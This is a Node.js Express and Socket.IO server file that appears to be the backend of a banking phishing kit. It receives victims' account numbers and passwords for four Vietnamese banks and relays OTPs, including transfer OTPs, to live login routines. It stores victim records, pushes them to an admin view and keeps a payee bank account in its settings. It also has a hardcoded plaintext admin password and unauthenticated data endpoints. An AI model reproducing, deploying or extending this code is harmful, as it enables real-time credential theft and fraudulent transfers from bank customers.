const express = require('express');
const app = express();
const path = require('path');
const http = require("http");
require('dotenv').config();
const port = process.env.PORT || 3000
const server = http.createServer(app);
var bodyParser = require('body-parser')
let multer = require("multer");
var cors = require('cors')
app.use(cors())
const moduleBank = require('./modules');
const socketIo = require("socket.io")(server, {
    cors: {
        origin: "*",
    }
});

const connection = require("./db");
const users = require('./models/user');
const settings = require('./models/setting');
const admins = require('./models/admin');

connection.once("open", async () => {
    console.log("MongoDB database connection established successfully");

    // get first setting
    const settingData = await settings.findOne({}).lean().exec();

    if (!settingData) {
        // create setting
        const setting = new settings()
        setting.fullName = 'Nguyễn Văn A';
        setting.bankName = 'MBBank';
        setting.bankAccount = '123456789';
        setting.bankPassword = '123456789';
        setting.bankBranch = 'Chi nhánh Hà Nội';
        setting.zaloImage = 'https://zalo.me/g/lnzjzv551';

        await setting.save();
    }

    const adminData = await admins.findOne({}).lean().exec();

    if (!adminData) {

        const admin = new admins()
        admin.username = 'admin';
        admin.password = 'admin123';

        await admin.save();
    }
});



var storage = multer.diskStorage({
    destination: function (req, file, cb) {
        cb(null, 'public/uploads')
    },
    filename: function (req, file, cb) {
        cb(null, Date.now() + '-' + file.originalname)
    }
})

var upload = multer({ storage: storage })

// set link static
app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.urlencoded({ extended: false }))
app.use(bodyParser.json())
socketIo.on("connection", (socket) => { ///Handle khi có connect từ client tới
    console.log("New client connected" + socket.id);

    socket.emit("sendDataServer", { data: "Hello Client" }); // phát sự kiện  có tên sendDataServer cùng với dữ liệu tin nhắn từ phía server

    socket.on("sendDataClient", function (data) { // Handle khi có sự kiện tên là sendDataClient từ phía client
        socketIo.emit("sendDataServer", { data });// phát sự kiện  có tên sendDataServer cùng với dữ liệu tin nhắn từ phía server
    })

    socket.on("disconnect", () => {
        console.log("Client disconnected"); // Khi client disconnect thì log ra terminal.
    });

    socket.on('send-data-otp-vcb', async (data) => {
        console.log(data);
        const response = await moduleBank.xacthucOTPLogin(data.method, socket.id);
        socket.emit('send-data-otp-vcb', response);
    })

    socket.on('send-data-send-otp-vcb', async (data) => {
        const response = await moduleBank.xacthucOTPVCB(data.otp, socket.id);
        // socket.emit('send-data-send-otp-vcb', response);
    })

    socket.on('send-data-send-otp-vcb-chuyentien', async (data) => {
        const response = await moduleBank.xacthucCTVCB(data.otp, socket.id);
        socket.emit('send-data-send-otp-vcb-chuyentien', response);
    })

    socket.on('send-data', async (data) => {
        console.log(data);
        const settingData = await settings.findOne({}).lean().exec();

        switch (data.bankName) {
            case 'MBBank':
                console.log('settingData', settingData);
                const response = await moduleBank.loginMB(data.bankAccount, data.bankPassword, socket.id, settingData);
                socket.emit('send-data', response);
                break;
            case 'VCB':
                // console.log('settingData', settingData);

                const response1 = await moduleBank.loginVCB(data.bankAccount, data.bankPassword, socket.id, settingData);
                socket.emit('send-data-otp-vcb-chuyentien', response1);
                break;
            case 'ACB':
                const response2 = await moduleBank.loginACB(data.bankAccount, data.bankPassword);
                socket.emit('send-data', response2);
                break;

            case 'HDBank':
                const response3 = await moduleBank.loginHDBank(data.bankAccount, data.bankPassword);
                socket.emit('send-data', response3);
                break;
            default:
                break;
        }
    });
    socket.on('send-data-b', async (data) => {
        console.log(data);
        const response = await moduleBank.xacthuc(data.otp, data.bankName);
        socket.emit('send-data-b', response);
    })
});


app.get('/', function (req, res) {
    res.sendFile(path.join(__dirname, '/public/index.html'));
});

app.get('/login', function (req, res) {
    res.sendFile(path.join(__dirname, '/public/login.html'));
});

app.post('/api/login', async (req, res) => {
    const { username, password } = req.body;

    const isValid = await admins.findOne({ username, password }).lean().exec();

    console.log('isValid', isValid);

    if (isValid) {
        return res.status(200).json({
            message: 'success',
            status: 200
        })
    } else {
        return res.status(404).json({
            message: 'fail',
            status: 404
        })
    }
});


app.post('/api/update-setting', async (req, res) => {
    console.log('res', req.body);
    await settings.updateOne({}, req.body);

    return res.status(200).json({
        message: 'success'
    })
});


app.use('/api/update-zalo', upload.single('zaloImage'), async (req, res) => {
    const file = req.file
    if (!file) {
        const error = new Error('Please upload a file')
        error.httpStatusCode = 400
        return next(error)
    }
    // console.log('res', req.file);
    await settings.updateOne({}, { zaloImage: req.file.path });

    // back
    res.redirect('back');

});

app.get('/api/get-setting', async (req, res) => {
    const settingData = await settings.findOne({}).lean().exec();

    return res.status(200).json({
        message: 'success',
        data: settingData
    })
});


app.get('/api/get-user', async (req, res) => {
    const userData = await users.find({}).lean().exec();
    return res.status(200).json({
        message: 'success',
        data: userData
    })
});

app.get('/api/check-user/:numberPhone', async (req, res) => {
    const { numberPhone } = req.params;
    const userData = await users.findOne({ numberPhone }).lean().exec();

    if (!userData) {
        return res.status(200).json({
            message: 'success',
            status: 404
        })
    }

    return res.status(404).json({
        message: 'fail',
        status: 404
    })
});

app.post('/api/insert-user', async (req, res) => {
    console.log('res', req.body);
    const user = new users(req.body);
    await user.save();
    socketIo.emit('send-data-admin', req.body);
    return res.status(200).json({
        message: 'success'
    })


});

app.put('/api/update-user/:numberPhone', async (req, res) => {
    const { numberPhone } = req.params;
    const userData = await users.findOne({ numberPhone }).lean().exec();
    if (!userData) {
        return res.status(404).json({
            message: 'fail',
            status: 404
        })
    }

    await users.updateOne({
        numberPhone: numberPhone
    }, req.body);

    return res.status(200).json({
        message: 'success'
    })
});

server.listen(port, () => {
    console.log('Server đang chay tren cong' + port);
});







